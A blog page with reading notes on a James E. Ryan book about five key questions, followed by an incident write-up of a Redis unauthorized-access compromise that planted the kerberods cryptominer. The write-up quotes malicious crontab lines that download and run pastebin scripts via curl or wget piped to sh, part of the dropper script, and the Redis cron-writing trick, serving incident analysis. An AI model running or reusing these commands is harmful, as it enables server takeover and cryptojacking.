                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/method/" itemprop="url" rel="index"><span itemprop="name">method</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>詹姆斯·E.瑞安（James E. Ryan） 著</strong></p>
<p><strong>引言 问题不对，你永远不会成功</strong></p>
<ul>
<li><strong>2014年演讲主题</strong></li>
</ul>
<blockquote>
<p>在为哈佛大学2014届毕业班重新改写这篇演讲稿时，我发现自己在30年前努力想传达的信息就是，我们不应把时间浪费在担惊受怕上——担忧过去、未来、不确定性、他人、新创意、新环境。时至今日，我仍然坚信如此。</p>
</blockquote>
<ul>
<li><strong>2015年演讲主题</strong></li>
</ul>
<blockquote>
<p>轮到我忏悔的时候，我先是询问神父，如果不能坦白所有的罪行，会有什么后果。其实我就是想看看我还有什么选择的余地。而神父却说：“这也是一种罪行。这是不作为之罪。”我心想：真该死。（当然，我没有把这句话说出口。）神父解释说，没有做到你应该做的事情，其罪过与有意去做错误的事情一样严重。</p>
</blockquote>
<ul>
<li><strong>2016年演讲主题</strong></li>
</ul>
<blockquote>
<p>2016年春天，随着毕业季的临近，朋友和同事们开始询问我打算在毕业典礼上讲些什么。有一段时间，我只是条件反射般地回答“这是个好问题”而已，我知道，这个回答很蹩脚。但后来我意识到，“好问题”可以作为毕业演讲的主题，再加上我一直以来对提问的痴迷，这个主题更是顺理成章了。 问题与答案同样重要，甚至问题往往更为重要。道理很简单：答案的好坏是由问题来决定的。如果提出的问题是错误的，那么你得到的答案也将是错误的。 第一个建议是，花更多的时间思考应该提出的问题。 我的第二个建议：聆听“好问题”也很重要。</p>
</blockquote>
<p><strong>第一章 先理解，后下定论</strong></p>
<blockquote>
<p>提问“等等，你说什么？”不仅能够帮助你厘清思路，也能够帮助他人梳理想法。 在任何情况下，先让对方解释说明，再进行申辩。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简而言之，“等等，你说什么？”这个问题之所以不可或缺，是它对于理解来说至关重要，因此也是充实而有意义的职业生涯和个人生活的关键。对于你所遇到的人和想法，你的理解越深，这个世界对于你而言就越精彩。另外，培养先理解、后下定论的习惯，也能够帮助你规避毫无意义的争执，加深你与周围的人的联系。一个看似简单的问题就能让你有这样的收获，这结果真不赖。</span><br></pre></td></tr></table></figure>

<p><strong>第二章 保持好奇心，建立新认知</strong></p>
<blockquote>
<p>提问“不知道为什么？”会让你对这个世界保持好奇心，提问“不知道能不能？”能够让你保持与这个世界的联系。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">好奇心也能带来同理心，而当下的人们正严重缺乏同理心。好奇心强的人更健康，尤其是不容易焦虑，因为他们能把新的环境看作学习的机会，而不是揭露自己懂得不够多的考验。某些研究证明，好奇心强的人也更容易长寿，这估计是因为他们与周围环境的联系更加紧密。</span><br><span class="line">总的来说，“不知道为什么？”这个问题之所以不可或缺，就在于它直指好奇心的根本，提问能让人对周围世界以及自己在世界上的定位保持好奇心。“不知道能不能？”这个问题之所以不可或缺，是这个问题能让你保持与世界的紧密联系，并能让你开始思考该如何对你所处的“一亩三分地”做出改善。如果提不出这些问题，你就有可能错失你从未意识到的乐趣与可能性。</span><br></pre></td></tr></table></figure>

<p><strong>第三章 后退一步，前进两步</strong></p>
<blockquote>
<p>提问“我们能不能至少……”是一种破解僵局的好方法。这是一种超越分歧、达成某种共识的好方法。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在提问“我们能不能至少……”这个问题的时候，你其实就是在建议你和对方试着做些事情，比如达成一定的协议或是着手启动某个项目。如果不问这个问题，你们或许根本不会去尝试。我认为，不做尝试是人类某些最深刻的悔恨的源泉，正因如此，我才会在我的第二次哈佛大学毕业典礼演讲上谈到不作为之罪。我认为，与实际做到的事情相比，我们没有去做的事情往往会给我们造成更大的心理负担。</span><br></pre></td></tr></table></figure>

<p><strong>第四章 不要表现出“救世主”姿态</strong></p>
<blockquote>
<p>用“我能帮什么忙？”这个问题来开头，你就是在抱着谦虚的心态寻求指点。这个问题不仅向对方表达了尊重，也很可能让你的协助更有的放矢。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没有人能够明了这一生的终极意义，即便如此，我们现在最重要的任务还是去观察和品味身边稍纵即逝的美好。</span><br></pre></td></tr></table></figure>

<p><strong>第五章 谨慎分辨重点和无关信息</strong></p>
<blockquote>
<p>“真正重要的是什么？”这个问题不仅会帮助你深入问题或难题的根源，也能帮助你抵达生活的核心。 关于工作、家庭、友情，以及该如何行善，这些主题中的重点需要你自己做出判断。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当你的人生走到尽头，你所看重的东西会是什么？到那时，物质利益只会占很小的比重，而你与他人之间的情谊才会是你人生的关键。</span><br></pre></td></tr></table></figure>

<p><strong>结语 人生如是，你是否获得了你想要的东西？</strong></p>
<blockquote>
<p>“等等，你说什么？”是一切理解的源泉。 “不知道为什么？”是一切好奇心的根源。 “我们能不能至少……”是一切进步的起始。 “我能帮什么忙？”是所有美满关系的根基。 “真正重要的是什么？”能帮助你触及生活的核心。 如果你的生活由好奇心和理解力的阴阳两极驱动，如果你保持愿意尝试新事物、帮助别人、从别人那里学习的劲头，如果你能专注于对你真正重要的事物，那么我相信，当提出附加问题的时机来临的时候，你就有资格回答 结语</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/12/2019/04/2019-04-12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E5%AE%89%E5%85%A8%E7%BB%84%E6%BC%8F%E6%B4%9E%E6%8B%9B%E8%87%B4kerberods%E6%9D%A5%E6%8C%96%E7%9F%BF/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/12/2019/04/2019-04-12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E5%AE%89%E5%85%A8%E7%BB%84%E6%BC%8F%E6%B4%9E%E6%8B%9B%E8%87%B4kerberods%E6%9D%A5%E6%8C%96%E7%9F%BF/index/" class="post-title-link" itemprop="url">Redis未授权访问及安全组漏洞招致kerberods来挖矿</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-12 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-12T08:00:00+08:00">2019-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">security</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>参考文档</strong> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/94237.html">https://www.freebuf.com/articles/web/94237.html</a> <a target="_blank" rel="noopener" href="https://www.4hou.com/vulnerable/13843.html">https://www.4hou.com/vulnerable/13843.html</a> <a target="_blank" rel="noopener" href="https://laucyun.com/17e194c26e4554cab975aae760bad553.html">https://laucyun.com/17e194c26e4554cab975aae760bad553.html</a></p>
<p><strong>现象</strong> 服务器CPU飙升 故障时间2019.4.10 17:50 top及htop查看信息只能看到1个cpu信息，默认是4个</p>
<p><strong>排错</strong> 排查发现crontab异常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos ~]# crontab -l</span><br><span class="line">*/15 * * * * （curl -fsSL https://pastebin.com/raw/xmxHzu5P||wget -q -O- https://pastebin.com/raw/xmxHzu5P)|sh</span><br></pre></td></tr></table></figure>

<p><strong>先简单解决问题</strong> 重命名curl wget yum等工具，然后停止cron服务，删除crontab任务并禁锢cron任务中root文件，并修改host伪造pastebin.com解析，问题暂时得到了解决</p>
<p><strong>然后分析问题</strong> 手工试了下这个脚本的威力，具体的也可以访问这个网站查看 <a target="_blank" rel="noopener" href="https://pastebin.com/raw/xmxHzu5P">https://pastebin.com/raw/xmxHzu5P</a> ，这里会木马启动文件&#x2F;usr&#x2F;sbin&#x2F;kerberods 后来网上查了下该病毒短时间内即造成大量 Linux 主机沦陷，它的传播方式分为三种，分别是： - 从 known_hosts 文件读取 IP 列表，用于登录信任该主机的其他主机，并控制它们执行恶意命令 - 利用 Redis 未授权访问和弱密码这两种常见的配置问题进行控制它们执行恶意命令 - 利用 SSH 弱密码进行爆破，然后控制它们执行恶意命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos tmp]# wgetold -q -O- https://pastebin.com/raw/xmxHzu5P</span><br><span class="line">export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">mkdir -p /tmp</span><br><span class="line">chmod 1777 /tmp</span><br><span class="line">rm -rf /tmp/go.sh</span><br><span class="line">rm -rf /tmp/go2.sh</span><br><span class="line">ps -ef|grep -v grep|grep hwlh3wlh44lh|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep Circle_MI|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep get.bi-chi.com|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep hashvault.pro|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep nanopool.org|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/.sshd|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;xmr&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;xig&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;ddgs&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;qW3xT&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;wnTKYg&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;t00ls.ru&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;sustes&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;thisxxs&quot;|awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;hashfish&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kworkerds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;/tmp/devtool&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;systemctI&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kpsmouseds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kthrotlds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kintegrityds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;suolbcc&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps aux|grep -v grep|grep -v khugepageds|awk &#x27;&#123;if($3&gt;=80.0) print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">apt-get install curl -y||yum install curl -y||apk add curl -y</span><br><span class="line">apt-get install cron -y||yum install crontabs -y||apk add cron -y</span><br><span class="line">systemctl start crond</span><br><span class="line">systemctl start cron</span><br><span class="line">systemctl start crontab</span><br><span class="line">service </span><br></pre></td></tr></table></figure>

<p><strong>查找当时哪些文件被修改了</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos / ]#find ./ -mtime -1 -type f  -exec ls -lt &#123;&#125; \; | grep &quot;17:50&quot;</span><br><span class="line">-rw-r--r-- 1 root root 9216 Apr 10 17:50 ./etc/pki/nssdb/cert9.dbold</span><br><span class="line">-rw-r--r-- 1 root root 11264 Apr 10 17:50 ./etc/pki/nssdb/key4.dbold</span><br><span class="line">-rw-r--r-- 1 root root 35773 Apr 10 17:50 ./etc/ld.so.cache</span><br><span class="line">-rw-r--r-- 1 root root 35773 Apr 10 17:50 ./etc/crond.d/tomcat</span><br><span class="line">-rw-r--r-- 1 root root 17 Apr 10 17:50 ./run/systemd/system/session-460352.scope</span><br><span class="line">-rw-r--r-- 1 root root 17 Apr 10 17:50 ./run/systemd/system/session-460351.scope</span><br><span class="line">-rw------- 1 root root 28903 Apr 10 17:50 ./var/cache/ldconfig/aux-cache</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 10 17:50 ./var/cache/yum/x86_64/7/timedhosts.txt</span><br><span class="line">-rw-r--r-- 3 root root 6 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/checksum_type</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/from_repo_revision</span><br><span class="line">-rw-r--r-- 1 root root 36 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/var_uuid</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/from_repo_timestamp</span><br><span class="line">-rw-r--r-- 1 root root 87 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/origin_url</span><br><span class="line">-rw-r--r-- 1 root root 64 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/checksum_data</span><br><span class="line">-rw-r--r-- 1 root root 5 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/var_infra</span><br><span class="line">-rw-r--r-- 3 root root 15 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/command_line</span><br><span class="line">-rw-r--r-- 3 root root 6 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/checksum_type</span><br><span class="line">-rw-r--r-- 1 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/from_repo_revision</span><br><span class="line">-rw-r--r-- 1 root root 36 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/var_uuid</span><br><span class="line">-rw-r--r-- 1 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/from_repo_timestamp</span><br><span class="line">-rw-r--r-- 1 root root 97 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/origin_url</span><br><span class="line">-rw-r--r-- 1 root root 64 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/checksum_data</span><br><span class="line">-rw-r--r-- 1 root root 5 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/var_infra</span><br><span class="line">-rw-r--r-- 3 root root 15 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/command_line</span><br><span class="line">-rw-r--r-- 1 root root 7 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/from_repo</span><br><span class="line">-rw-r--r-- 3 root root 6 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/checksum_type</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/from_repo_revision</span><br><span class="line">-rw-r--r-- 1 root root 36 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/var_uuid</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/from_repo_timestamp</span><br><span class="line">-rw-r--r-- 1 root root 90 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/origin_url</span><br><span class="line">-rw-r--r-- 1 root root 64 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/checksum_data</span><br><span class="line">-rw-r--r-- 1 root root 5 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/var_infra</span><br><span class="line">-rw-r--r-- 3 root root 15 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/command_line</span><br><span class="line">-rw-------. 1 root root 896000 Apr 10 17:50 ./var/lib/yum/history/history-2016-04-21.sqlite</span><br><span class="line">-rw-r--r-- 1 root root 3597 Apr 10 17:50 ./var/lib/yum/history/2016-04-21/21/config-main</span><br><span class="line">-rw-r--r-- 1 root root 8391 Apr 10 17:50 ./var/lib/yum/history/2016-04-21/21/config-repos</span><br><span class="line">-rw-r--r-- 1 root root 1722 Apr 10 17:50 ./var/lib/yum/history/2016-04-21/21/saved_tx</span><br><span class="line">-rw-------. 1 root root 33536 Apr 10 17:50 ./var/lib/yum/history/history-2016-04-21.sqlite-journal</span><br><span class="line">-rw-r--r-- 1 root root 45 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/version</span><br><span class="line">-rw-r--r-- 1 root root 2692 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/conflicts</span><br><span class="line">-rw-r--r-- 1 root root 3105 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/obsoletes</span><br><span class="line">-rw-r--r-- 1 root root 60927 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/pkgtups-checksums</span><br><span class="line">-rw-r--r-- 1 root root 23303 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/file-requires</span><br><span class="line">-rw-r--r--. 1 root root 12288 Apr 10 17:50 ./var/lib/rpm/Installtid</span><br><span class="line">-rw-r--r--. 1 root root 2273280 Apr 10 17:50 ./var/lib/rpm/Dirnames</span><br><span class="line">-rw-r--r--. 1 root root 40960 Apr 10 17:50 ./var/lib/rpm/Sigmd5</span><br><span class="line">-rw-r--r--. 1 root root 65536 Apr 10 17:50 ./var/lib/rpm/Sha1header</span><br><span class="line">-rw-r--r--. 1 root root 36864 Apr 10 17:50 ./var/lib/rpm/Name</span><br><span class="line">-rw-r--r--. 1 root root 73367552 Apr 10 17:50 ./var/lib/rpm/Packages</span><br><span class="line">-rw-r--r--. 1 root root 8192 Apr 10 17:50 ./var/lib/rpm/Conflictname</span><br><span class="line">-rw-r--r--. 1 root root 20480 Apr 10 17:50 ./var/lib/rpm/Group</span><br><span class="line">-rw-r--r--. 1 root root 188416 Apr 10 17:50 ./var/lib/rpm/Requirename</span><br><span class="line">-rw-r--r--. 1 root root 1617920 Apr 10 17:50 ./var/lib/rpm/Providename</span><br><span class="line">-rw-r--r--. 1 root root 3084288 Apr 10 17:50 ./var/lib/rpm/Basenames</span><br><span class="line">-rw------- 1 root root 161 Apr 10 17:50 ./var/log/yum.log</span><br></pre></td></tr></table></figure>

<p><strong>发现问题文件</strong> 发现一个比较可疑的文件，文件当时没用删除是二进程形式，通过xxd能查看，大概如下内容，比较奇怪的是redis格式的，而且还有redis版本，后来谷歌发现redis无密码确实有被利用的风险</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos / ]#cat /etc/crond.d/tomcat</span><br><span class="line">REDIS 0008%09 redis-ver4.0.6 redis-bits 򳨭used-memq</span><br><span class="line">þ񱴮time@Gts󿿀򳨭eec¯used-memP</span><br><span class="line">*/15 * * * * root wget -q -O- https://pastebin.com/raw/v5XC0BJh|sh</span><br><span class="line">##</span><br><span class="line">caches@F</span><br><span class="line">*/10 * * * * root curl -fsSL https://pastebin.com/raw/v5XC0BJh|sh</span><br><span class="line">##</span><br></pre></td></tr></table></figure>

<p><strong>利用redis未授权漏洞复盘攻击过程</strong> 下面展示利用 Redis 未授权访问和弱密码这两种常见的配置问题进行控制它们执行恶意命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos ~]# redis-cli</span><br><span class="line">127.0.0.1:6379&gt; KEYS *</span><br><span class="line">1) &quot;runtime&quot;</span><br><span class="line">2) &quot;caches&quot;</span><br><span class="line">127.0.0.1:6379&gt; GET runtime</span><br><span class="line">&quot;\n*/15 * * * * wget -q -O- https://pastebin.com/raw/v5XC0BJh|sh\n##\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; get caches</span><br><span class="line">&quot;\n*/10 * * * * curl -fsSL https://pastebin.com/raw/v5XC0BJh|sh\n##\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line">127.0.0.1:6379&gt; DEL runtime</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; del caches</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; KEYS *</span><br><span class="line">(empty list or set)</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/var/spool/cron/crontabs&quot;</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;root&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>检查known_host文件</strong> 挖矿病毒kerberods会暴力破解known_hosts里面主机的密码，还会扫描known_hosts主机是否对外开通6379端口，要是开放了redis端口可以利用redis远程执行漏洞，直接ssh免密登陆远程服务器继续扩散病毒 [root@VM_3_114_centos .ssh]# cat known_hosts</p>
<p><strong>介绍kerberods木马</strong> - kerberods木马启动程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 